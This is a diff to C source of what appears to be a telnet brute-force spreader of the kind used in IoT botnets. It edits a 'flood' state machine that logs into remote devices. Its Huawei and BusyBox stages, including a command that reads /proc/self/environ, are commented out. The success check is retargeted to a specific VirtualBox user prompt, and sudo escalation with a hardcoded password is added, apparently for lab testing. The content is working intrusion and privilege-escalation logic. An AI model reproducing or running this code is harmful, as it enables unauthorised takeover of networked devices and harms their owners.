@@ -407,19 +407,19 @@ void *flood(void *par1)
                 {
                     while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                     {
-                        //special case for huawei
-                        if (memmem(buf, got, "Huawei Home Gateway", 19) != NULL)
-                            state->special = 1;
-                        
-                        if (memmem(buf, got, "BusyBox", 7) != NULL)
-                        {
-                            state->got_prompt = 1;
-                            
-                            //maybe we are logged in already? LOL
-                            sockprintf(state->fd, "enable\r\n");
-                            state->state = 7;
-                            break;
-                        }
+//                        //special case for huawei
+//                        if (memmem(buf, got, "Huawei Home Gateway", 19) != NULL)
+//                            state->special = 1;
+//
+//                        if (memmem(buf, got, "BusyBox", 7) != NULL)
+//                        {
+//                            state->got_prompt = 1;
+//
+//                            //maybe we are logged in already? LOL
+//                            sockprintf(state->fd, "enable\r\n");
+//                            state->state = 7;
+//                            break;
+//                        }
                         
                         if (memmem(buf, got, "ogin", 4) != NULL || memmem(buf, got, "sername", 7) != NULL || matchPrompt(buf))
                         {
@@ -456,10 +456,10 @@ void *flood(void *par1)
                             break;
                         }
                         
-                        if (strcasestr(buf, "BusyBox") != NULL || matchPrompt(buf))
+                        if (strcasestr(buf, "olly@jolly2-VirtualBox:~$") != NULL || matchPrompt(buf))
                         {
                             //REASONABLY sure we got a good login.
-                            sockprintf(state->fd, "enable\r\n");
+                            sockprintf(state->fd, "sudo -s\r\n");
                             state->state = 6;
                             break;
                         }
@@ -470,26 +470,29 @@ void *flood(void *par1)
                 {
                     while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                     {
-                        sockprintf(state->fd, "shell\r\n");
-                        state->state = 7;
-                        break;
+                        if (strcasestr(buf, "sudo] password for jolly:") != NULL || matchPrompt(buf))
+                        {
+                            sockprintf(state->fd, "jolly\r\n");
+                            state->state = 8;
+                            break;
+                        }
                     }
                 }
                 
-                if (state->state == 7)
-                {
-                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
-                    {
-                        sockprintf(state->fd, "sh\r\n");
-                        if (state->special == 1)
-                        {
-                            state->state = 250;
-                        } else {
-                            state->state = 8;
-                        }
-                        break;
-                    }
-                }
+//                if (state->state == 7)
+//                {
+//                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
+//                    {
+//                        sockprintf(state->fd, "sh\r\n");
+//                        if (state->special == 1)
+//                        {
+//                            state->state = 250;
+//                        } else {
+//                            state->state = 8;
+//                        }
+//                        break;
+//                    }
+//                }
                 
                 if (state->state == 8)
                 {
@@ -659,19 +662,20 @@ void *flood(void *par1)
                         }
                     }
                 }
-                
-                if (state->state == 250)
-                {
-                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
-                    {
-                        if (matchPrompt(buf))
-                        {
-                            sockprintf(state->fd, "show text /proc/self/environ\r\n");
-                            state->state = 251;
-                            break;
-                        }
-                    }
-                }
+
+                // special state for Huawei Home Gateway
+//                if (state->state == 250)
+//                {
+//                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
+//                    {
+//                        if (matchPrompt(buf))
+//                        {
+//                            sockprintf(state->fd, "show text /proc/self/environ\r\n");
+//                            state->state = 251;
+//                            break;
+//                        }
+//                    }
+//                }
                 
                 if (state->state == 251)
                 {
